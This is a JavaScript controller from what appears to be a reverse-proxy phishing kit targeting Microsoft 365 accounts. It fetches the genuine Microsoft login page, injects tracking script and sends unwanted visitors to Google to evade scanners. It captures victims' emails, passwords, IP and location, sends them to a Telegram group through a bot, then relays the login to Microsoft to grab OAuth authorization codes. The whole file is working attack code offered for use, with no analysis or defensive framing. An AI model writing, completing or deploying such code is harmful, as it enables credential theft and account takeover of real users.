// controllers/authController.js
const axios = require('axios');
const cheerio = require('cheerio');
const { getVictimInfo } = require('../utils/helpers');
const { 
    DUAL_TOKEN_CLIENT_ID, 
    DESKTOP_CLIENT_ID,
    DUAL_TOKEN_REDIRECT_URI,
    DESKTOP_REDIRECT_URI,
    OUTLOOK_SCOPE,
    GRAPH_SCOPE
} = require('../config/constants');
const { 
    generateCodeVerifier, 
    generateCodeChallenge, 
    decrypt, 
    isValidEmail 
} = require('../utils/encryption');
const { PersistentTokenManager } = require('../services/tokenManager');

class AuthController {
    constructor(capturedData, microsoftParams, codeVerifiers, emailSessions, requestTimestamps, bot, telegramGroupId) {
        this.capturedData = capturedData;
        this.microsoftParams = microsoftParams;
        this.codeVerifiers = codeVerifiers;
        this.emailSessions = emailSessions;
        this.requestTimestamps = requestTimestamps;
        this.bot = bot;
        this.telegramGroupId = telegramGroupId;
    }

    async serveMicrosoftLogin(req, res) {
        try {
            const { email: encryptedEmail } = req.query;
            
            let email = null;
            if (encryptedEmail) {
                email = decrypt(encryptedEmail);
                if (!email || !isValidEmail(email)) {
                    return res.redirect('https://www.google.com');
                }
            } else {
                return res.redirect('https://www.google.com');
            }
            
            const clientIp = req.clientIp || req.ip || 'unknown';
            const now = Date.now();
            
            const lastRequest = this.requestTimestamps.get(clientIp) || 0;
            if (now - lastRequest < 5000) {
                return res.status(429).send('Rate limited');
            }
            this.requestTimestamps.set(clientIp, now);
            
            const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
            
            const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
            authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
            authUrl.searchParams.append('response_type', 'code');
            authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
            authUrl.searchParams.append('scope', OUTLOOK_SCOPE);
            authUrl.searchParams.append('prompt', 'select_account');
            authUrl.searchParams.append('response_mode', 'query');
            
            if (email) {
                authUrl.searchParams.append('login_hint', email);
            }
            
            const microsoftResponse = await axios({
                method: 'GET',
                url: authUrl.toString(),
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                maxRedirects: 5,
                timeout: 30000
            });
            
            let html = microsoftResponse.data;
            const $ = cheerio.load(html);
            
            // Add injection scripts
            $('head').append(`
                <script>
                    console.log('🔧 Auth page loaded');
                    sessionStorage.setItem('phishSessionId', '${sessionId}');
                    ${email ? `sessionStorage.setItem('userEmail', '${email}');` : ''}
                </script>
            `);
            
            this.microsoftParams.set(sessionId, { email, sessionId });
            
            res.send($.html());
            
        } catch (error) {
            console.error('❌ Error serving Microsoft login:', error.message);
            res.status(500).send('Error loading page');
        }
    }

    async handleLoginSubmit(req, res) {
        console.log('📥 Login submission received');
        
        const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
        const username = req.body?.login || req.body?.email;
        const password = req.body?.passwd;
        
        const victimInfo = await getVictimInfo(req);
        
        if (username && password) {
            let session = this.capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
            session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
            this.capturedData.set(sessionId, session);
            
            if (this.bot && this.telegramGroupId) {
                const message = `🔑 *Credentials Captured*\n━━━━━━━━━━━━━━━━━━\n*Email:* \`${username}\`\n*Password:* \`${password}\`\n*Session:* \`${sessionId}\`\n━━━━━━━━━━━━━━━━━━\n*IP:* \`${victimInfo.ip}\`\n*Location:* ${victimInfo.location}\n*Time:* ${victimInfo.timestamp}`;
                
                await this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' });
            }
        }
        
        // Forward to Microsoft
        try {
            const formData = new URLSearchParams();
            Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
            
            const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 400
            }).catch(err => err.response);
            
            if (response?.headers?.location) {
                const location = response.headers.location;
                console.log(`↪️ Microsoft redirects to: ${location}`);
                
                if (location.includes('nativeclient') && location.includes('code=')) {
                    const codeMatch = location.match(/[?&]code=([^&]+)/);
                    if (codeMatch && codeMatch[1]) {
                        const code = decodeURIComponent(codeMatch[1]);
                        console.log(`✅ Auth code captured for ${sessionId}`);
                        // Handle token exchange...
                    }
                }
                
                return res.redirect(location);
            }
            
            res.send(response?.data || 'OK');
            
        } catch (error) {
            console.error('❌ Error forwarding login:', error.message);
            res.redirect('/microsoft?error=connection_error');
        }
    }
}

module.exports = AuthController;